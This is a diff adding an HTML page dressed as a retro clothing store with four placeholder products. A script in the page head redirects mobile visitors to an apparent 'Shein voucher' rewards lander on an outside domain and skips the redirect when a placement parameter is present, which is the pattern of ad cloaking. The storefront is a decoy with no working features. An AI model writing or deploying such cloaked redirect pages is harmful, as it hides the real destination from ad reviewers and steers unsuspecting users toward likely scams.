@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://voucherewards.com/shein?slug=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retro Revival Clothing Co.</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #FFD700;
+            color: #8B008B;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #FF69B4;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #00CED1;
+        }
+        nav {
+            background-color: #00FF00;
+            padding: 10px;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        nav ul li {
+            display: inline;
+            margin-right: 20px;
+        }
+        nav ul li a {
+            color: #FF4500;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        main {
+            padding: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+        }
+        .product {
+            background-color: #FF1493;
+            border: 3px solid #4B0082;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 10px;
+            width: 200px;
+            text-align: center;
+        }
+        footer {
+            background-color: #FF69B4;
+            color: #FFFFFF;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Retro Revival Clothing Co.</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Shop</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="product">
+            <h2>Neon Windbreaker</h2>
+            <p>Get your 80s groove on!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Acid Wash Jeans</h2>
+            <p>Classic 90s style!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Disco Collar Shirt</h2>
+            <p>Saturday Night Fever vibes!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Platform Boots</h2>
+            <p>Reach new heights!</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Retro Revival Clothing Co. | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
